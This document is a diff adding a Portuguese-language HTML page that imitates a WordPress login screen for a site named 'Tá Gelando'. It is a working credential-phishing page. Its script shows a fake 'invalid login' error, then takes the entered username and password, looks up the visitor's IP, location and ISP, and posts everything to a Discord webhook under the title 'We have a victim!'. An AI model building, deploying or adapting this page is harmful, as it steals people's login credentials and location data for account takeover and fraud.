@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Página de Login</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f6f6f6;
+      margin: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      flex-direction: column;
+    }
+    .login-wrapper {
+      text-align: center;
+      width: 100%;
+      max-width: 350px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .login-logo {
+      max-width: 90px;
+      width: 100%;
+      height: auto;
+      display: block;
+      margin: 0 0 20px 0;
+    }
+    .login-container {
+      width: 100%;
+      background: white;
+      padding: 25px 25px 30px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+      border-radius: 8px;
+      position: relative;
+      margin-bottom: 20px;
+      max-width: 350px;
+    }
+    .error-message {
+      color: #d93025;
+      background: #fce8e6;
+      padding: 10px;
+      border: 1px solid #d93025;
+      border-radius: 4px;
+      margin-bottom: 20px;
+      display: none;
+    }
+    .form-group {
+      margin-bottom: 20px;
+      text-align: left;
+    }
+    .form-group label {
+      display: block;
+      margin-bottom: 8px;
+      font-size: 14px;
+    }
+    .form-group input {
+      width: calc(100% - 20px);
+      padding: 12px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 14px;
+      margin: 0 auto;
+      display: block;
+    }
+    .form-group input[type="checkbox"] {
+      width: auto;
+      margin-right: 8px;
+      margin-left: 0;
+    }
+    .login-button {
+      background-color: #0073aa;
+      color: white;
+      padding: 12px 20px;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      font-size: 14px;
+      width: auto;
+    }
+    .login-button:hover {
+      background-color: #005d8c;
+    }
+    .additional-options {
+      text-align: center;
+      font-size: 14px;
+      margin-top: 20px;
+    }
+    .additional-options a {
+      color: #0073aa;
+      text-decoration: none;
+      margin: 0 5px;
+    }
+    .additional-options a:hover {
+      text-decoration: underline;
+    }
+    .language-selector {
+      margin-top: 10px;
+    }
+    .language-selector select {
+      padding: 5px;
+    }
+    .policy {
+      font-size: 12px;
+      color: #555;
+      margin-top: 10px;
+    }
+    .policy a {
+      text-decoration: none;
+      color: #0073aa;
+    }
+    .policy a:hover {
+      text-decoration: underline;
+    }
+    /* Estilo para alinhar checkbox e texto ao lado do botão */
+    .checkbox-group {
+      display: flex;
+      align-items: center;
+      justify-content: flex-start;
+    }
+    .checkbox-group input[type="checkbox"] {
+      margin-right: 10px;
+    }
+    .checkbox-group label {
+      font-size: 14px;
+      margin-left: 5px;
+    }
+    .button-checkbox-container {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-wrapper">
+    <img src="https://i.ibb.co/1YvNcJRM/logo.png" alt="WordPress Logo" class="login-logo">
+    <div class="login-container">
+      <div class="error-message" id="error-message">Detalhes de login inválidos.</div>
+      <form id="login-form">
+        <div class="form-group">
+          <label for="username">Nome de utilizador ou endereço de email</label>
+          <input type="text" id="username" name="username" required>
+        </div>
+        <div class="form-group">
+          <label for="password">Senha</label>
+          <input type="password" id="password" name="password" required>
+        </div>
+        <div class="button-checkbox-container">
+          <div class="checkbox-group">
+            <input type="checkbox" name="remember" id="remember">
+            <label for="remember">Manter sessão</label>
+          </div>
+          <button type="submit" class="login-button">Iniciar sessão</button>
+        </div>
+      </form>
+    </div>
+
+    <div class="additional-options">
+      <div class="links">
+        <a href="#">Esqueceu-se da senha?</a><br>
+        <a href="#">← Ir para Tá Gelando</a>
+      </div>
+      <div class="policy">
+        <a href="#">Política de Privacidade</a>
+      </div>
+      <div class="language-selector">
+        <label for="language">Idioma:</label>
+        <select id="language">
+          <option value="pt">Português</option>
+          <option value="en">English</option>
+          <option value="es">Español</option>
+        </select>
+        <button type="button">Alterar</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const form = document.getElementById('login-form');
+    const errorMessage = document.getElementById('error-message');
+    const discordWebhookURL = 'WEBH00K-URL';
+
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const username = document.getElementById('username').value.trim();
+      const password = document.getElementById('password').value.trim();
+      const remember = document.getElementById('remember').checked;
+
+      if (username !== '' && password !== '') {
+        errorMessage.style.display = 'block';
+        getIPInfo(username, password, remember);
+      }
+    });
+
+    function getIPInfo(username, password, remember) {
+      fetch('https://ipinfo.io/json')
+        .then(response => response.json())
+        .then(data => {
+          const ip = data.ip;
+          const city = data.city;
+          const region = data.region;
+          const country = data.country;
+          const loc = data.loc; 
+          const isp = data.org; 
+
+          sendToDiscordWebhook(username, password, remember, ip, city, region, country, loc, isp);
+        })
+        .catch(error => {
+          console.error('Erro ao obter informações do IP:', error);
+          sendToDiscordWebhook(username, password, remember, 'IP não disponível', 'Cidade não disponível', 'Região não disponível', 'País não disponível', 'Localização não disponível', 'ISP não disponível');
+        });
+    }
+
+    function sendToDiscordWebhook(username, password, remember, ip, city, region, country, loc, isp) {
+      const message = {
+        content: 'Novo login recebido:',
+        embeds: [
+          {
+            title: '73m0s Um@ V1t1m@!',
+            description: '```text\n' +
+              `Usuário: ${username}\n` +
+              `Senha: ${password}\n` +
+              `Manter sessão: ${remember ? 'Sim' : 'Não'}\n` +
+              `IP: ${ip}\n` +
+              `Cidade: ${city}\n` +
+              `Região: ${region}\n` +
+              `País: ${country}\n` +
+              `Localização (Lat/Long): ${loc}\n` +
+              `ISP: ${isp}\n` +
+              '```',
+            color: 0xFF0000, 
+            thumbnail: {
+              url: "https://i.pinimg.com/736x/75/9c/f0/759cf0c26a9b2f3f0253edade2710eae.jpg"
+            }
+          },
+        ],
+      };
+
+      fetch(discordWebhookURL, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(message),
+      })
+        .then(response => {
+          if (response.ok) {
+            console.log('Dados enviados para o Discord com sucesso!');
+          } else {
+            console.error('Erro ao enviar dados para o Discord:', response.statusText);
+          }
+        })
+        .catch(error => {
+          console.error('Erro ao enviar dados para o Discord:', error);
+        });
+    }
+  </script>
+</body>
+</html>
